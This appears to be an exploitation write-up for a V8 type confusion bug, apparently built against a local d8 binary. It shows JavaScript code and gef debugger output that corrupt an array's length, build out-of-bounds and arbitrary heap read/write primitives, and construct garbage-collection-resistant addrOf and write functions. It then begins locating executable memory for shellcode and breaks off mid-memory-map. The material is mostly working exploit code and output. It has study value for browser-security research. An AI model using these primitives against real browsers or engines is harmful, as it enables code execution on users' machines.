# Trigger

Successfully trigger the type confusion:

```shell
Debug of corrupted_instance.x
DebugPrint: 0x118e00404bcd: [JSArray] in OldSpace
 - map: 0x118e0018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
             ^^^^^^^^^^^^^^
              same with a
 - length: 8
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.x
DebugPrint: 0x118e00404c01: [JSArray] in OldSpace
 - map: 0x118e0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS] <--- different elements kind
             ^^^^^^^^^^^^^^
              same with x
 - length: 1
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

# Initial read-write primitives

Once the vulnerability is triggered, the same memory region is used for storing the backing buffer of an array with objects (x) as well as the backing buffer and metadata of a packed double array (a). This means that the length property of the packed double array a can be modified by writing to certain elements in the object array.

Look at the memory of JSArray again:

```shell
Debug of corrupted_instance.a
DebugPrint: 0x25a200404ccd: [JSArray] in OldSpace
 - map: 0x25a20018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x25a20018e935 <JSArray[0]>
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x25a2000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x25a200000d41: [String] in ReadOnlySpace: #length: 0x25a200025e2d <AccessorInfo name= 0x25a200000d41 <String[6]: #length>, data= 0x25a200000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Memmory dump at elements:

```shell
gef➤  x/64x 0x25a200404cbd - 1
0x25a200404cbc:	0x00000851	0x00000002	0x9999999a	0x3ff19999
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of FDA   length=1           1.1              <-- pointer tagging, length = 2 on memory
0x25a200404ccc:	0x0018efc1	0x000006cd	0x00404cbd	0x00000002
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of JSArray                       length of JSArray <-- at offset 5
```

FDA stand for FixedDoubleArray.

The following code attempts to write `0x10000` to the length field of the object array:

```js
corrupted_instance.x[5] = 0x10000;
```

Output:

```shell
[+] Triggering the bug...
[+] Corrupting the metadata (length) of corrupted_instance.a ..
[+] Initial corruption succeeded!
Debug of corrupted_instance.x
DebugPrint: 0x17f900404c3d: [JSArray] in OldSpace
 - map: 0x17f90018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
 - length: 8
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.a
DebugPrint: 0x17f900404c71: [JSArray] in OldSpace
 - map: 0x17f90018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536 <---- 0x10000
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Once the length of the array is overwritten, out of bounds read/write can be performed, relative to the position of the backing element buffer of the array. To make use of this, the exploit allocates another packed double array and **finds the offset and the element index to reach its metadata from the start of the elements buffer of the corrupted array**.

```js
print("Perfoming read/write out of bounds...");
while (true) {
   let rwarr = [1.1, 2.2, 3.3];
   let rwarr_addr = addrof_tmp(rwarr);
   let a_addr = addrof_tmp(corrupted_instance.a);

   // If our target array to corrupt does not lie after our corrupted array, then
   // we can't do anything. Bail and retry the exploit.
   if (rwarr_addr < a_addr) {
      // print("[+] Target array does not lie after corrupted array. Retrying...");
   } else {
      print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
      print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
      debug_print(`corrupted_instance.a`, corrupted_instance.a);
      debug_print(`rwarr`, rwarr);
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc; // 0xc is the offset from the metadata to the backing storage
      if ((offset % 8) != 0) {
            offset -= 4; // turn back 4 bytes if the offset is not divisible by 8 (each element is 8 bytes long),
            // because we need to convert it to number of elements
            // used for changing the backing storage of rwarr through corrupted_instance.a
      }
      print("[+] Offset: " + offset);

      let marker42_idx = offset / 8; // idex of backing storage of corrupted_instance.a
      // marker42_idx += 9; // no need
      break;
   }
}
```

Debug print out both buffers:

```shell
DebugPrint: 0x3ba1001a5d15: [JSArray] in OldSpace
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> {
           0: 1.1
 }

Debug of rwarr
DebugPrint: 0x3ba1002c267d: [JSArray]
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }

[+] Calculating the offset...
[+] Offset: 1165680
[+] Address of backing storage pointer of rwarr: 2c2684
```

First, we calculate the address of the backing storage pointer of `rwarr` from `rwarr_addr`:

```shell
gef➤  x/12x 0x3ba1002c267d - 1 + 8
0x3ba1002c2684:	0x002c265d	0x00000006	0x00001085	0x001a5d51
                  ^^^^^^^^^^
                  elements
0x3ba1002c2694:	0x000007b1	0x002c267d	0x3ff19999	0x000007b1
0x3ba1002c26a4:	0x001a5d15	0x3ff19999	0x000005dd	0x0000000e
```

Then, add `a_addr` with the offset to get the same address:

```shell
gef➤  p 0x3ba1001a5d15 -1 + 1165680
$12 = 0x3ba1002c2684
```

After that, the offset from the backing storage of `corrupted_instance.a` to get the same address need to be added by 16:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165680 + 16
$14 = 0x3ba1002c2684
```

The reason is that the backing storage of `corrupted_instance.a` is 16 bytes before the JSArray object.

```shell
gef➤  x/24x 0x3ba1001a5d05 - 1
0x3ba1001a5d04:	0x00000851	0x00000002	0x001a5d15	0x3ff19999
                  ^^^^^^^^^^                                      
                  Map of FixedDoubleArray                         
0x3ba1001a5d14:	0x0018efc1	0x000006cd	0x001a5d05	0x00020000
                  ^^^^^^^^^^
                  Map of JSArray
0x3ba1001a5d24:	0x001a357d	0x001a357d	0x00000a09	0x00000000
0x3ba1001a5d34:	0x000015d5	0x00028991	0x001a5d2d	0x0018efc1
0x3ba1001a5d44:	0x000006cd	0x002c2149	0x00000006	0x0000150d
0x3ba1001a5d54:	0x001a5d41	0x00000000	0x002c2615	0x00000001
```

We convert the above calculation into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165696
$15 = 0x3ba1002c2684
```

And into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 145712*8
$16 = 0x3ba1002c2684
```

Where `145712` is our index of the element that points to the backing storage of rwarr.

Now, we have the ability to point to any memory address as we want through `corrupted_instance.a[145712]`.

If the elements pointer of this array is modified to point to a specific value, then writing to an index in the rwarr will write a controlled float to this chosen address thereby achieving an arbitrary write in the V8 heap.

```js
function v8h_write64(where, what) {
    helper.f64[0] = corrupted_instance.a[marker42_idx];
    if (helper.u32[0] == 0x6) {
        helper.f64[0] = corrupted_instance.a[marker42_idx - 1];
        helper.u32[1] = where - 8; // don't know why -8
        corrupted_instance.a[marker42_idx - 1] = helper.f64[0];
    } else if (helper.u32[1] == 0x6) {
        helper.u32[0] = where - 8;
        corrupted_instance.a[marker42_idx] = helper.f64[0];
    }
    rwarr[0] = what;
}
```

The first if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717
0x3cb6002c297c:	0x00000006	0x00001085	0x001a6021	0x000007b1
                  ^^^^^^^^^^  ^^^^^^^^^^
                    u32[0]      u32[1]
0x3cb6002c298c:	0x002c2971	0x3ff19999	0x000007b1	0x001a5fe5
0x3cb6002c299c:	0x3ff19999	0x00000155	0x00000003	0x0000001d
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 8
0x3cb6002c2974:	0x000006cd	0x002c2951	0x00000006	0x00001085
                              ^^^^^^^^^^  
                             u32[1]=where-8    
0x3cb6002c2984:	0x001a6021	0x000007b1	0x002c2971	0x3ff19999
0x3cb6002c2994:	0x000007b1	0x001a5fe5	0x3ff19999	0x00000155
```

The else if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 4
0x3cb6002c2978:	0x002c2951	0x00000006	0x00001085	0x001a6021
                  ^^^^^^^^^^  ^^^^^^^^^^
                u32[0]=where-8   u32[1]
0x3cb6002c2988:	0x000007b1	0x002c2971	0x3ff19999	0x000007b1
0x3cb6002c2998:	0x001a5fe5	0x3ff19999	0x00000155	0x00000003
```

Try to write something:

```js
print("[+] Writing data...");
let data = 13.37;                                    // have to be float because rwarr is a float array
let bufToBeWritten = [1.1, 2.2, 3.3, 4.4];
let bufToBeWritten_addr = addrof_tmp(bufToBeWritten);
v8h_write64(bufToBeWritten_addr - 1 + 0x10, data);   // 0x10 is offset of length of JSArray
debug_print('bufToBeWritten', bufToBeWritten);
```

Calculating offset and index:

```shell
[+] Perfoming read and write out of bounds...
[+] Calculating the offset...
[+] Offset: 1298520
[+] Calculating the index...
[+] Index: 162316
[+] The approximately view of pointer's data: 0x13ffd1 0x6
```

Debug print of `bufToBeWritten`:

```shell
[+] Writing data...
Debug of bufToBeWritten
DebugPrint: 0x227005422c5: [JSArray]
 - map: 0x02270018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x02270018e935 <JSArray[0]>
 - elements: 0x0227005422dd <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 511705092 <---- it changed from 4
 - properties: 0x0227000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x22700000d41: [String] in ReadOnlySpace: #length: 0x022700025e2d <AccessorInfo name= 0x022700000d41 <String[6]: #length>, data= 0x022700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x0227005422dd <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.2
           2: 3.3
           3: 4.4
}
```

However both, the `addrof` as well as the write primitive depend on there being no garbage collection run after the successful trigger of the bug. This is because if a GC occurs, then it will move the objects in memory and primitives like corruption of the array elements will no longer work because the metadata and elements region of the array maybe moved to separate regions by the Garbage Collector. A GC can also crash the engine if it sees corrupted metadata like corrupted maps or array lengths or elements pointers.

# GC Resistant Primitives

After triggering GC for moving objects into old space:

```shell
Debug of holder
DebugPrint: 0x385d0019c909: [JS_OBJECT_TYPE] in OldSpace
Debug of changer
DebugPrint: 0x385d0019c931: [JSArray] in OldSpace
Debug of leaker
DebugPrint: 0x385d0019c921: [JSArray] in OldSpace
```

All of the objects are moved to old space.

Once the vulnerability is triggered, the exploit uses the initial `addrof` to find the address of the `changer`/`leaker`/`holder` objects. It then overwrites the elements pointer of the changer object to point to the address of the leaker `object` and also overwrites the elements pointer of leaker `object` to point to the address of the holder `object`. This corruption is done using the heap write primitive achieved in the previous section. The following code shows this.

Layout:

```js
+-------------------------------+
| Changer (Array)               |
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Leaker (Array)                |<-----------------------------+
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Holder (Object)               |<-----------------------------+
|-------------------------------|
| p1: 0x1234                    |
| p2: 0x1234                    |
| p3: 0x1234                    |
+-------------------------------+
```

Here is how we do it:

```js
changer_addr = addrof_tmp(changer);
leaker_addr = addrof_tmp(leaker);
holder_addr = addrof_tmp(holder);

helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
original_holder_bytes = helper.f64[0];

helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
v8h_write64(changer_addr + 0x8, helper.f64[0]);                //0x8 is offset of `elements` pointer
v8h_write64(leaker_addr + 0x8, original_holder_bytes);
```

Output:

```shell
Debug of changer
DebugPrint: 0xa980019ca7d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca6d <JSArray[6]> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of leaker
DebugPrint: 0xa980019ca6d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca55 <Object map = 0xa980019c2fd> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of holder
DebugPrint: 0xa980019ca55: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x0a980019c2fd <Map[24](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0a9800184b21 <Object map = 0xa980018415d>
 - elements: 0x0a98000006cd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0a98000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0xa980019bdd9: [String] in OldSpace: #p1: 4660 (const data field 0), location: in-object
    0xa980019bde9: [String] in OldSpace: #p2: 4660 (const data field 1), location: in-object
    0xa980019bdf9: [String] in OldSpace: #p3: 4660 (const data field 2), location: in-object
 }
```

Also, remember to fix the corrupted arrays

```js
corrupted_instance.x.length = 0;
corrupted_instance.a.length = 0;
rwarr.length = 0;
```

Use new primitives to read/write:

```js
print("[+] Using new primitives to read data");
v8h_read64(bufToBeWritten_addr + 0x8);
print("[+] The original data: 0x" + helper.u32[0].toString(16) + " 0x" + helper.u32[1].toString(16));
debug_print('bufToBeWritten', bufToBeWritten);

print("[+] Using new primitives to write data");
v8h_write(bufToBeWritten_addr - 1 + 0x10, data);
debug_print('bufToBeWritten', bufToBeWritten);
```

Output:

```shell
[+] Using new primitives to read data
[+] The original data: 0x54223d
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
[+] Using new primitives to write data
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 109051908
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

Also, we can leak address with a new `addrOf` primitive:

```js
function addrOf(obj) {
    holder.p2 = obj;
    let ret = leaker[1];
    holder.p2 = 0;
    return helper.f64toi64(ret) & 0xffffffffn;
}
```

Output:

```shell
[+] The address of bufToBeWritten: 0x542205
Debug of bufToBeWritten
DebugPrint: 0x19a700542205: [JSArray]
 - map: 0x19a70018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x19a70018e935 <JSArray[0]>
 - elements: 0x19a70054221d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x19a7000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x19a700000d41: [String] in ReadOnlySpace: #length: 0x19a700025e2d <AccessorInfo name= 0x19a700000d41 <String[6]: #length>, data= 0x19a700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

# Shellcode

We need to find `jump_table_start` offset.

Memory in used:

```shell
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000023d12b399000 0x000023d12b39a000 0x0000000000000000 rwx 
0x000026b500000000 0x000026b500040000 0x0000000000000000 rw- 
0x000026b500040000 0x000026b510000000 0x0000000000000000 --- 
0x00002bfd00000000 0x00002c0500000000 0x0000000000000000 --- 
0x00002c0500000000 0x00002c0500010000 0x0000000000000000 r-- 
0x00002c0500010000 0x00002c0500020000 0x0000000000000000 --- 
0x00002c0500020000 0x00002c0500040000 0x0000000000000000 r-- 
0x00002c0500040000 0x00002c0500145000 0x0000000000000000 rw- 
0x00002c0500145000 0x00002c0500180000 0x0000000000000000 --- 
0x00002c0500180000 0x00002c0500283000 0x0000000000000000 rw- 
0x00002c0500283000 0x00002c05002c0000 0x0000000000000000 --- 
0x00002c05002c0000 0x00002c0500300000 0x0000000000000000 rw- 
0x00002c0500300000 0x00002c0500314000 0x0000000000000000 r-- 
0x00002c0500314000 0x00002c0500340000 0x0000000000000000 --- 
0x00002c0500340000 0x00002c0500640000 0x0000000000000000 rw- 
0x00002c0500640000 0x00002c0600000000 0x0000000000000000 --- 
0x00002c0600000000 0x00002c0600100000 0x0000000000000000 rw- 
0x00002c0600100000 0x00002c0800000000 0x0000000000000000 --- 
0x00002c0800000000 0x00002c0802000000 0x0000000000000000 --- 
0x00002c0802000000 0x00002c0880000000 0x0000000000000000 --- 
0x00002c0880000000 0x00002c0880010000 0x0000000000000000 rw- 
0x00002c0880010000 0x00002d0d00000000 0x0000000000000000 --- 
0x00005b6ec4a00000 0x00005b6ec4a03000 0x0000000000000000 rw- 
0x00005b6ec4a03000 0x00005b6ec4a04000 0x0000000000000000 --- 
0x00005b6ec4a04000 0x00005b6ec4a3f000 0x0000000000000000 rwx 
0x00005b6ec4a3f000 0x00005b6ec4a40000 0x0000000000000000 --- 
0x00005b6ec4a40000 0x00005b6ec4a43000 0x0000000000000000 rw- 
0x00005b6ec4a43000 0x00005b6ec4a44000 0x0000000000000000 --- 
0x00005b6ec4a44000 0x00005b6ec4a7f000 0x0000000000000000 rwx 
0x00005b6ec4a7f000 0x00005b6ee4a00000 0x0000000000000000 --- 
0x00005b6eeba40000 0x00005b6eec9d6000 0x0000000000000000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eec9d7000 0x00005b6eede8e000 0x0000000000f96000 r-x /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eede8e000 0x00005b6eedf05000 0x000000000244c000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eedf06000 0x00005b6eedf0f000 0x00000000024c3000 rw- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eedf0f000 0x00005b6eedf10000 0x00000000024cc000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eedf10000 0x00005b6eedf11000 0x00000000024cd000 rw- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eedf11000 0x00005b6eedf12000 0x00000000024ce000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eedf12000 0x00005b6eedf20000 0x00000000024cf000 rw- /home/aleister/Workspaces/v8-exploitation/v8/out/x64.release/d8
0x00005b6eedf20000 0x00005b6eedf50000 0x0000000000000000 rw- 
0x00005b6efcb68000 0x00005b6efcc41000 0x0000000000000000 rw- [heap]
0x0000738f70000000 0x0000738f70077000 0x0000000000000000 rw- 
0x0000738f70077000 0x0000738f74000000 0x0000000000000000 --- 
0x0000738f74000000 0x0000738f74032000 0x0000000000000000 rw- 
0x0000738f74032000 0x0000738f78000000 0x0000000000000000 --- 
0x0000738f7c000000 0x0000738f7c021000 0x0000000000000000 rw- 
0x0000738f7c021000 0x0000738f80000000 0x0000000000000000 --- 
0x0000738f83a00000 0x0000738f83a10000 0x0000000000000000 r-- 
0x0000738f83a10000 0x0000738fc3a00000 0x0000000000000000 --- 
0x0000738fc3c00000 0x0000738fc3c10000 0x0000000000000000 r-- 
0x0000738fc3c10000 0x0000738fc3c20000 0x0000000000000000 rw- 
0x0000738fc3c20000 0x0000738fc7c00000 0x0000000000000000 --- 
0x0000738fc7e00000 0x0000738fc7e10000 0x0000000000000000 r-- 
0x0000738fc7e10000 0x0000738fc8040000 0x0000000000000000 rw- 
0x0000738fc8040000 0x0000739007e00000 0x0000000000000000 --- 
0x0000739008000000 0x0000739008021000 0x0000000000000000 rw- 
0x0000739008021000 0x000073900c000000 0x0000000000000000 --- 
0x0000739010000000 0x0000739010021000 0x0000000000000000 rw- 
0x0000739010021000 0x0000739014000000 0x0000000000000000 --- 
0x0000739014000000 0x0000739014021000 0x0000000000000000 rw- 
0x0000739014021000 0x0000739018000000 0x0000000000000000 --- 
0x0000739018000000 0x0000739018021000 0x0000000000000000 rw- 
0x0000739018021000 0x000073901c000000 0x0000000000000000 --- 
0x0000739020000000 0x0000739020021000 0x0000000000000000 rw- 
0x0000739020021000 0x0000739024000000 0x0000000000000000 --- 
0x0000739024000000 0x0000739024021000 0x0000000000000000 rw- 
0x0000739024021000 0x0000739028000000 0x0000000000000000 --- 
0x000073902a400000 0x000073902a410000 0x0000000000000000 r-- 
0x000073902a410000 0x000073902a430000 0x0000000000000000 rw- 
0x000073902a430000 0x000073902b400000 0x0000000000000000 --- 
0x000073902b600000 0x000073902b601000 0x0000000000000000 --- 
0x000073902b601000 0x000073902be01000 0x0000000000000000 rw- 
0x000073902c000000 0x000073902c021000 0x0000000000000000 rw- 
0x000073902c021000 0x0000739030000000 0x0000000000000000 --- 
0x0000739030000000 0x0000739030021000 0x0000000000000000 rw- 
0x0000739030021000 0x0000739034000000 0x0000000000000000 --- 
0x0000739034400000 0x0000739034401000 0x0000000000000000 --- 
0x0000739034401000 0x0000739034c01000 0x0000000000000000 rw- 
0x0000739034e00000 0x0000739034e01000 0x0000000000000000 --- 
0x0000739034e01000 0x0000739035601000 0x0000000000000000 rw- 
0x0000739035800000 0x0000739035801000 0x0000000000000000 --- 
0x0000739035801000 0x0000739036001000 0x0000000000000000 rw- 
0x0000739036200000 0x0000739036201000 0x0000000000000000 --- 
0x0000739036201000 0x0000739036a01000 0x0000000000000000 rw- 
0x0000739036c00000 0x0000739036c01000 0x0000000000000000 --- 
0x0000739036c01000 0x0000739037401000 0x0000000000000000 rw- 
0x0000739037600000 0x0000739037601000 0x0000000000000000 --- 
0x0000739037601000 0x0000739037e01000 0x0000000000000000 rw- 
0x0000739038000000 0x0000739038021000 0x0000000000000000 rw- 
0x0000739038021000 0x000073903c000000 0x0000000000000000 --- 
0x000073903c000000 0x000073903c021000 0x0000000000000000 rw- 
0x000073903c021000 0x0000739040000000 0x0000000000000000 --- 
0x0000739040400000 0x0000739040401000 0x0000000000000000 --- 
0x0000739040401000 0x0000739040c01000 0x0000000000000000 rw- 
0x0000739040e00000 0x0000739040e01000 0x0000000000000000 --- 
0x0000739040e01000 0x0000739041601000 0x0000000000000000 rw- 
0x0000739041800000 0x0000739041801000 0x0000000000000000 --- 
0x0000739041801000 0x0000739042001000 0x0000000000000000 rw- 
0x0000739042200000 0x0000739042201000 0x0000000000000000 --- 
0x0000739042201000 0x0000739042a01000 0x0000000000000000 rw- 
0x0000739042c00000 0x0000739042c01000 0x0000000000000000 --- 
0x0000739042c01000 0x0000739043401000 0x0000000000000000 rw- 
0x0000739043600000 0x0000739043601000 0x0000000000000000 --- 
0x0000739043601000 0x0000739043e01000 0x0000000000000000 rw- 
0x0000739044000000 0x0000739044021000 0x0000000000000000 rw- 
0x0000739044021000 0x0000739048000000 0x0000000000000000 --- 
0x0000739048000000 0x0000739048021000 0x0000000000000000 rw- 
0x0000739048021000 0x000073904c000000 0x0000000000000000 --- 
0x000073904c400000 0x000073904c401000 0x0000000000000000 --- 
0x000073904c401000 0x000073904cc01000 0x0000000000000000 rw- 
0x000073904ce00000 0x000073904ce01000 0x0000000000000000 --- 
0x000073904ce01000 0x000073904d601000 0x0000000000000000 rw- 
0x000073904d800000 0x000073904d801000 0x0000000000000000 --- 
0x000073904d801000 0x000073904e001000 0x0000000000000000 rw- 
0x000073904e200000 0x000073904e201000 0x0000000000000000 --- 
0x000073904e201000 0x000073904ea01000 0x0000000000000000 rw- 
0x000073904ec00000 0x000073904ec01000 0x0000000000000000 --- 
0x000073904ec01000 0x000073904f401000 0x0000000000000000 rw- 
0x000073904f600000 0x000073904f601000 0x0000000000000000 --- 
0x000073904f601000 0x000073904fe01000 0x0000000000000000 rw- 
0x0000739050000000 0x0000739050021000 0x0000000000000000 rw- 
0x0000739050021000 0x0000739054000000 0x0000000000000000 --- 
0x0000739054000000 0x0000739054021000 0x0000000000000000 rw- 
0x0000739054021000 0x0000739058000000 0x0000000000000000 --- 
0x0000739058400000 0x0000739058401000 0x0000000000000000 --- 
0x0000739058401000 0x0000739058c01000 0x0000000000000000 rw- 
0x0000739058e00000 0x0000739058e01000 0x0000000000000000 --- 
0x0000739058e01000 0x0000739059601000 0x0000000000000000 rw- 
0x0000739059800000 0x0000739059801000 0x0000000000000000 --- 
0x0000739059801000 0x000073905a001000 0x0000000000000000 rw- 
0x000073905a200000 0x000073905a201000 0x0000000000000000 --- 
0x000073905a201000 0x000073905aa01000 0x0000000000000000 rw- 
0x000073905ac00000 0x000073905ac01000 0x0000000000000000 --- 
0x000073905ac01000 0x000073905b401000 0x0000000000000000 rw- 
0x000073905b600000 0x000073905b601000 0x0000000000000000 --- 
0x000073905b601000 0x000073905be01000 0x0000000000000000 rw- 
0x000073905c000000 0x000073905c021000 0x0000000000000000 rw- 
0x000073905c021000 0x0000739060000000 0x0000000000000000 --- 
0x0000739060800000 0x0000739060801000 0x0000000000000000 --- 
0x0000739060801000 0x0000739061001000 0x0000000000000000 rw- 
0x0000739061200000 0x0000739061201000 0x0000000000000000 --- 
0x0000739061201000 0x0000739061a01000 0x0000000000000000 rw- 
0x0000739061c00000 0x0000739061c01000 0x0000000000000000 --- 
0x0000739061c01000 0x0000739062401000 0x0000000000000000 rw- 
0x0000739062600000 0x0000739062601000 0x0000000000000000 --- 
0x0000739062601000 0x0000739062e01000 0x0000000000000000 rw- 
0x0000739063000000 0x0000739063001000 0x0000000000000000 --- 
0x0000739063001000 0x0000739063801000 0x0000000000000000 rw- 
0x0000739063a00000 0x0000739063a01000 0x0000000000000000 --- 
0x0000739063a01000 0x0000739064201000 0x0000000000000000 rw- 
0x0000739064400000 0x0000739064401000 0x0000000000000000 --- 
0x0000739064401000 0x0000739064c01000 0x0000000000000000 rw- 
0x0000739064e00000 0x0000739064e01000 0x0000000000000000 --- 
